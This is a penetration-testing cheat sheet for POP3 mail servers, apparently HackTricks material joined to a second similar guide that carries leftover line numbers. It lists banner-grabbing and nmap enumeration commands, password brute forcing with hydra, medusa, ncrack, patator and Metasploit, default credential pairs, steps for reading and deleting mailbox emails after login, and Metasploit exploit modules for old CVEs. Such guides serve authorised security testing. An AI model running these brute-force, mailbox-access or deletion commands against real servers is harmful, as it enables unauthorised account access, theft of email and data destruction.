# 110,995 - Pentesting POP

## Basic Information

**Post Office Protocol (POP)** is a standard protocol for receiving emails. POP3 is a client/server protocol in which email is received and held for you by your Internet server. As this protocol is frequently enabled and poorly configured, it can become a great target.

**Default ports:** 110, 995(ssl)

```
PORT    STATE SERVICE
110/tcp open  pop3
```
# Connect
## Manual Connection
You can use netcat to manually connect to a service:
```
nc <target-ip> 110
```
## Connect Using OpenSSL
You can use OpenSSL to test a secure POP3 connection:
```
openssl s_client -connect <ip>:995
```
### Banner Grabbing

```bash
nc -nv <IP> 110
openssl s_client -connect <IP>:995 -crlf -quiet
```

## Manual

Enumerating a POP3 service can sometimes lead to disclosed sensitive information or poorly configured systems. You can use the command `CAPA` to obtain the capabilities of the POP3 server.

## Automated

```bash
nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -port <PORT> <IP> #All are default scripts
nmap -p 110 --script pop3-ntlm-info <ip>
```
## Attack Vectors
### Bruteforce Attack
You can perform a POP3 bruteforce attack using Nmap
```
nmap -p 110 --script pop3-brute --script-args userdb=users.txt,passdb=pass.txt <ip>
```
Or you also can perform a POP3 bruteforce attack using Hydra
```
hydra -L <user list file> -P <password list file> -f <ip> pop3 -V
```
Post-Exploitation
### Extract Emails

Once logged into a POP3 account, use the RETR command to read emails. This could provide a wealth of information, including sensitive data.
```
RETR 1
```
## Delete Emails
You can use the DELE command to delete a specific email:
```
DELE 1
```
### Check for Credentials

You may find username/password combinations in emails, giving them additional account access.

### Look for Sensitive Data

Users often send sensitive data via email. This data can be personal, financial, or a corporate secret.



The `pop3-ntlm-info` plugin will return some "**sensitive**" data (Windows versions).

### [POP3 bruteforce](../generic-hacking/brute-force.md#pop)

## POP syntax

POP commands examples from [here](http://sunnyoasis.com/services/emailviatelnet.html)

```bash
POP commands:
  USER uid           Log in as "uid"
  PASS password      Substitue "password" for your actual password
  STAT               List number of messages, total mailbox size
  LIST               List messages and sizes
  RETR n             Show message n
  DELE n             Mark message n for deletion
  RSET               Undo any changes
  QUIT               Logout (expunges messages if no RSET)
  TOP msg n          Show first n lines of message number msg
  CAPA               Get capabilities
```

Example:

```
root@kali:~# telnet $ip 110
 +OK beta POP3 server (JAMES POP3 Server 2.3.2) ready 
 USER billydean    
 +OK
 PASS password
 +OK Welcome billydean

 list

 +OK 2 1807
 1 786
 2 1021

 retr 1

 +OK Message follows
 From: jamesbrown@motown.com
 Dear Billy Dean,

 Here is your login for remote desktop ... try not to forget it this time!
 username: billydean
 password: PA$$W0RD!Z
```

## Logging Passwords

POP servers with the setting **`auth_debug`** enabled will be increasing the logs generated. However, if **`auth_debug_passwords`** or **`auth_verbose_passwords`** are set as **`true`**, password could be also logged in clear text in those logs.

## HackTricks Automatic Commands

```
Protocol_Name:  POP   #Protocol Abbreviation if there is one.
Port_Number:  110     #Comma separated if there is more than one.
Protocol_Description: Post Office Protocol         #Protocol Abbreviation Spelled out

Entry_1:
  Name: Notes
  Description: Notes for POP
  Note: |
    Post Office Protocol (POP) is described as a protocol within the realm of computer networking and the Internet, which is utilized for the extraction and retrieval of email from a remote mail server**, making it accessible on the local device. Positioned within the application layer of the OSI model, this protocol enables users to fetch and receive email. The operation of POP clients typically involves establishing a connection to the mail server, downloading all messages, storing these messages locally on the client system, and subsequently removing them from the server. Although there are three iterations of this protocol, POP3 stands out as the most prevalently employed version.

    https://book.hacktricks.xyz/network-services-pentesting/pentesting-pop

Entry_2:
  Name: Banner Grab
  Description: Banner Grab 110
  Command: nc -nv {IP} 110

Entry_3:
  Name: Banner Grab 995
  Description: Grab Banner Secure
  Command: openssl s_client -connect {IP}:995 -crlf -quiet

Entry_4:
  Name: Nmap
  Description: Scan for POP info
  Command: nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -p 110 {IP}

Entry_5:
  Name: Hydra Brute Force
  Description: Need User
  Command: hydra -l {Username} -P {Big_Passwordlist} -f {IP} pop3 -V
  
Entry_6:
  Name: consolesless mfs enumeration
  Description: POP3 enumeration without the need to run msfconsole
  Note: sourced from https://github.com/carlospolop/legion
  Command: msfconsole -q -x 'use auxiliary/scanner/pop3/pop3_version; set RHOSTS {IP}; set RPORT 110; run; exit' 
  
```
POP3
POP3 usually uses ports 110, 995
What is POP3?
POP3 stands for Post Office Protocol. As the name suggests, it allows you to use your email inbox like a post office – emails are downloaded onto your computer and removed from the mail server.
When accessing your emails using the POP3 protocol, a copy of the emails is created and stored locally on your computer. The originals are usually, but not always, removed from the mail server. In other words, emails are tied to the specific device. Once the email is downloaded onto one device (and removed from the mail server), it cannot be accessed by another email client or device.
1
2
	PORT     STATE SERVICE               VERSION
110/tcp  open  pop3                  Zimbra Collabration Suite pop3d

POP3 Pentesting
  Shodan search query :
port:110, 995
Enumeration
Banner Grabbing
1
2
3
4
5
6
	telnet 10.10.x.x 110
nc -nv 10.10.x.x 110
nmap -p110 --script=banner 10.10.x.x
nmap -p110 --script=pop3-ntlm-info 10.10.x.x
msf > use auxiliary/scanner/pop3/pop3_version #MetasploitFramework
openssl s_client -connect <IP>:995 -crlf -quiet

 ![image](https://github.com/user-attachments/assets/f7faf723-c8f1-42d5-ba92-4d6194fca835)

Capabilities
1
2
3
4
	#All are default scripts
nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -port 110 192.168.x.x
# Retrieve POP3 server capabilities (CAPA, TOP, USER, SASL, RESP-CODES, LOGIN-DELAY, PIPELINING, EXPIRE, UIDL, IMPLEMENTATION)  
nmap -v -sV --version-intensity=5 --script pop3-capabilities -p T:110 192.168.x.x

 ![image](https://github.com/user-attachments/assets/8a64a7a9-fdb7-46f1-83fa-2ced13c70eeb)

 ![image](https://github.com/user-attachments/assets/189f3e49-955a-4226-a59e-69684e33027d)

The pop3-ntlm-info plugin will return some “sensitive” data (Windows versions).
POP3 Commands
1
2
3
4
5
6
7
8
9
10
11
	POP commands:
  USER uid           Log in as "uid"
  PASS password      Substitue "password" for your actual password
  STAT               List number of messages, total mailbox size
  LIST               List messages and sizes
  RETR n             Show message n
  DELE n             Mark message n for deletion
  RSET               Undo any changes
  QUIT               Logout (expunges messages if no RSET)
  TOP msg n          Show first n lines of message number msg
  CAPA               Get capabilities

Capturing POP3 Packages
1
	msf > use auxiliary/server/capture/pop3 #MetasploitFramework

POP3 Credentials
Authentication Checking (classical credentials)
USER	PASS
admin	admin
root	root
root	toor
Brute Forcing
1
2
3
4
5
6
7
8
9
10
11
12
	hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V
hydra -t 2 -L users.list -P passwords.list -M 10.10.x.x.list -s 110 pop3
# Try to bruteforce POP3 accounts
Nmap: pop3-brute –script-args userdb=users.list,passdb=passwords.list
nmap --script pop3-brute --script-args pop3loginmethod=SASL-LOGIN -p T:110 IP
nmap --script pop3-brute --script-args pop3loginmethod=SASL-CRAM-MD5 -p T:110 IP
nmap --script pop3-brute --script-args pop3loginmethod=APOP -p T:110 IP
msf > use auxiliary/scanner/pop3/pop3_login #MetasploitFramework
medusa -t 2 -T 2 -U users.list -P passwords.list -H 10.10.x.x.list -n 110 -M pop3
ncrack -g CL=2 -U users.list -P passwords.list -iL 10.10.x.x.list -p pop3:110 -oA output
patator pop3_login host=10.10.x.x user=FILE1 password=FILE0 0=users.list 1=passwords.list -x ignore:fgrep=’incorrect password or account name’

POP3 Vulnerabilities
1
2
3
4
5
	#Seattle Lab Mail 5.5 [CVE-2003-0264]
msf > use exploit/windows/pop3/seattlelab_pass #MetasploitFramework
Exploit-DB: 638.py, 643.c, 646.c
#Cyrus – Gentoo 2006.0 Linux 2.6 [CVE-2006-2502]
msf > use exploit/linux/pop3/cyrus_pop3d_popsubfolders #MetasploitFramework


